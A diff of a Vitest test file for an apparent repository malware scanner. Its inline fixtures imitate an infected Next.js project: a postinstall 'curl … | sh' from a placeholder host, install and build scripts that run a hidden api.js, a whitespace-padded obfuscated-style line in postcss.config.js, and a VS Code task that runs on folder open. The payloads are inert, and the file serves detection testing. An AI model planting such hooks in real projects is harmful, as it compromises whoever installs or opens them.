@@ -1,5 +1,4 @@
 import { describe, expect, it } from "vitest";
-import { DEMO_REPOS } from "@/lib/demo/fixtures";
 import { isHighRiskPath, shouldSkipBlob } from "@/lib/github/paths";
 import { analyzeRepositoryFiles } from "@/lib/scanner/engine";
 import { planRemediation } from "@/lib/sanitizer";
@@ -10,11 +9,128 @@ function analyze(files: Record<string, string>) {
   );
 }
 
-describe("demo repository pipeline", () => {
-  it("cleans the storefront fixture in one plan and leaves a valid project", () => {
-    const storefront = DEMO_REPOS.find((repo) => repo.name === "storefront");
-    expect(storefront).toBeTruthy();
-    const analyzed = analyze(storefront!.files);
+const pad = " ".repeat(72);
+const payload = `${pad}global['!']=_0xdemo4f2a;eval('void 0');Function('return 0')();${"/* synthetic-indicator */".repeat(24)}`;
+
+const STOREFRONT: Record<string, string> = {
+  "package.json": `{
+  "name": "storefront",
+  "private": true,
+  "dependencies": {
+    "next": "15.0.0",
+    "react": "19.0.0"
+  },
+  "scripts": {
+    "dev": "node api.js && next dev",
+    "build": "node api.js && next build",
+    "start": "node api.js && next start",
+    "lint": "next lint",
+    "preinstall": "node api.js",
+    "postinstall": "curl https://example.invalid/x | sh"
+  }
+}
+`,
+  "postcss.config.js": `module.exports = {
+  plugins: {
+    tailwindcss: {},
+    autoprefixer: {},
+  },
+};
+
+
+
+${payload}
+`,
+  ".gitignore": `node_modules
+.next
+dist
+api.js
+branch_structure.json
+temp_auto_push.bat
+temp_interactive_push.bat
+`,
+  "api.js": `const _0xdemo4f2a = ["indicator"];
+global["!"] = _0xdemo4f2a;
+eval("void 0");
+Function("return 0")();
+`,
+  ".vscode/tasks.json": `{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "install hook",
+      "type": "shell",
+      "command": "node api.js",
+      "runOn": "folderOpen"
+    },
+    {
+      "label": "test",
+      "type": "shell",
+      "command": "npm test"
+    }
+  ]
+}
+`,
+  ".vscode/settings.json": `{
+  "editor.formatOnSave": true,
+  "task.allowAutomaticTasks": "on"
+}
+`,
+};
+
+const DESIGN_SYSTEM: Record<string, string> = {
+  "package.json": `{
+  "name": "@northwind/design-system",
+  "private": true,
+  "dependencies": {
+    "react": "19.0.0"
+  },
+  "scripts": {
+    "dev": "storybook dev -p 6006",
+    "build": "storybook build",
+    "start": "storybook dev -p 6006",
+    "lint": "eslint ."
+  }
+}
+`,
+  "postcss.config.js": `module.exports = {
+  plugins: {
+    tailwindcss: {},
+    autoprefixer: {},
+  },
+};
+`,
+  ".github/workflows/ci.yml": `name: ci
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: npm test
+`,
+  ".vscode/settings.json": `{
+  "editor.formatOnSave": true
+}
+`,
+};
+
+const CLI: Record<string, string> = {
+  "api.js": STOREFRONT["api.js"],
+  ".vscode/tasks.json": STOREFRONT[".vscode/tasks.json"],
+  "package.json": `{
+  "name": "cli",
+  "scripts": {
+    "prepare": "node api.js && echo keep-me",
+    "dev": "node ./api.js && tsc -w"
+  }
+}
+`,
+};
+
+describe("repository pipeline", () => {
+  it("cleans an infected storefront in one plan and leaves a valid project", () => {
+    const analyzed = analyze(STOREFRONT);
 
     expect(analyzed.findings.map((finding) => finding.ruleId)).toEqual(
       expect.arrayContaining([
@@ -46,7 +162,7 @@ describe("demo repository pipeline", () => {
 
     expect(plan.find((change) => change.path === "api.js")?.action).toBe("delete");
 
-    const cleaned = { ...storefront!.files };
+    const cleaned = { ...STOREFRONT };
     for (const change of plan) {
       if (change.action === "delete") delete cleaned[change.path];
       else if (change.after != null) cleaned[change.path] = change.after;
@@ -55,14 +171,12 @@ describe("demo repository pipeline", () => {
     expect(again.findings.filter((finding) => finding.strategy !== "review-only")).toEqual([]);
   });
 
-  it("does not flag the clean design-system fixture", () => {
-    const repo = DEMO_REPOS.find((item) => item.name === "design-system");
-    expect(analyze(repo!.files).findings).toEqual([]);
+  it("does not flag a clean design-system tree", () => {
+    expect(analyze(DESIGN_SYSTEM).findings).toEqual([]);
   });
 
   it("keeps a legitimate prepare suffix after the runner", () => {
-    const repo = DEMO_REPOS.find((item) => item.name === "cli");
-    const analyzed = analyze(repo!.files);
+    const analyzed = analyze(CLI);
     const plan = planRemediation(analyzed.files, analyzed.findings);
     const manifest = plan.find((change) => change.path === "package.json");
     expect(JSON.parse(manifest?.after ?? "{}").scripts).toEqual({
